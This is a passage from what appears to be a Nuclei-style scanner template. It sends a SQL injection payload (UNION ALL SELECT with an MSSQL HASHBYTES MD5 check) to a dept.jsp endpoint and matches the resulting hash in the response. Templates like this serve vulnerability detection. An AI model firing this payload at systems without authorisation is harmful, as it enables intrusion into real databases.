      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "0x827ccb0eea8a706"
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/common/dept.jsp?deptid=1'' UNION ALL SELECT 60%2Csys.fn_sqlvarbasetostr(HASHBYTES(''MD5''%2C''12345''))--+'
